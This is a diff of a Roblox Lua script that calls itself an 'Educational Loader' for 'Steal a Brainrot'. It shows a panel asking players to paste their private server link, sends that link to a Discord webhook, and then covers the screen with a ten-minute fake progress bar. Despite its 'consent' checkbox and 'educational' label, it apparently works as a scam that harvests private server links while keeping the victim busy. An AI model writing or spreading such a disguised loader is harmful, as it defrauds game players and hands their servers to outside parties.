@@ -1,7 +1,6 @@
--- Steal a Brainrot | Educational Loader
+-- Educational Loader | Mobile/PC Safe
 -- Consent-based Discord webhook
--- Fullscreen 0–100% (10 minutes)
--- Mobile-safe version
+-- Fullscreen 0→100% progress (10 minutes)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -17,17 +16,17 @@ gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.fromScale(0.65, 0.4)
-frame.Position = UDim2.fromScale(0.5, 0.5)
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Size = UDim2.fromScale(0.65,0.4)
+frame.Position = UDim2.fromScale(0.5,0.5)
+frame.AnchorPoint = Vector2.new(0.5,0.5)
 frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
 frame.Active = true
 frame.Draggable = true
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0,14)
 
 local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, -20, 0, 50)
-title.Position = UDim2.new(0, 10, 0, 10)
+title.Size = UDim2.new(1,-20,0,50)
+title.Position = UDim2.new(0,10,0,10)
 title.BackgroundTransparency = 1
 title.Text = "Private Server Link Required"
 title.TextColor3 = Color3.new(1,1,1)
@@ -35,8 +34,8 @@ title.TextScaled = true
 title.Font = Enum.Font.GothamBold
 
 local box = Instance.new("TextBox", frame)
-box.Size = UDim2.new(1, -20, 0, 45)
-box.Position = UDim2.new(0, 10, 0, 70)
+box.Size = UDim2.new(1,-20,0,45)
+box.Position = UDim2.new(0,10,0,70)
 box.PlaceholderText = "Paste private server link here"
 box.Text = ""
 box.ClearTextOnFocus = false
@@ -48,8 +47,8 @@ Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)
 
 -- Consent checkbox
 local consent = Instance.new("TextButton", frame)
-consent.Size = UDim2.new(1, -20, 0, 35)
-consent.Position = UDim2.new(0, 10, 0, 125)
+consent.Size = UDim2.new(1,-20,0,35)
+consent.Position = UDim2.new(0,10,0,125)
 consent.Text = "[ ] I agree to send this link to Discord"
 consent.TextColor3 = Color3.new(1,1,1)
 consent.BackgroundColor3 = Color3.fromRGB(30,30,30)
@@ -66,8 +65,8 @@ consent.MouseButton1Click:Connect(function()
 end)
 
 local submit = Instance.new("TextButton", frame)
-submit.Size = UDim2.new(0.45, -10, 0, 40)
-submit.Position = UDim2.new(0.05, 0, 1, -50)
+submit.Size = UDim2.new(0.45,-10,0,40)
+submit.Position = UDim2.new(0.05,0,1,-50)
 submit.Text = "Submit"
 submit.BackgroundColor3 = Color3.fromRGB(0,170,255)
 submit.TextColor3 = Color3.new(1,1,1)
@@ -76,8 +75,8 @@ submit.TextScaled = true
 Instance.new("UICorner", submit).CornerRadius = UDim.new(0,10)
 
 local cancel = Instance.new("TextButton", frame)
-cancel.Size = UDim2.new(0.45, -10, 0, 40)
-cancel.Position = UDim2.new(0.5, 0, 1, -50)
+cancel.Size = UDim2.new(0.45,-10,0,40)
+cancel.Position = UDim2.new(0.5,0,1,-50)
 cancel.Text = "Cancel"
 cancel.BackgroundColor3 = Color3.fromRGB(200,60,60)
 cancel.TextColor3 = Color3.new(1,1,1)
@@ -131,9 +130,9 @@ local function startProgress()
         SoundService.Volume = 0.3
     end)
     local duration = 600 -- 10 minutes
-    for i = 1, 100 do
+    for i = 1,100 do
         label.Text = i .. "%"
-        bar.Size = UDim2.fromScale(i/100, 1)
+        bar.Size = UDim2.fromScale(i/100,1)
         task.wait(duration/100)
     end
     label.Text = "Completed"
@@ -142,7 +141,7 @@ end
 -- ===== Button connections =====
 submit.MouseButton1Click:Connect(function()
     if box.Text == "" then return end
-    sendWebhook(box.Text) -- зөвшөөрөлтэй webhook илгээх
+    sendWebhook(box.Text)
     frame.Visible = false
     full.Visible = true
     task.spawn(startProgress)
